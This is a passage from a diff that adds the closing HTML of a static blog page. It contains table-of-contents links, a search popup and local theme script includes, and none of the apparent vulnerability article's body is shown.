href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="nav-number">4.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
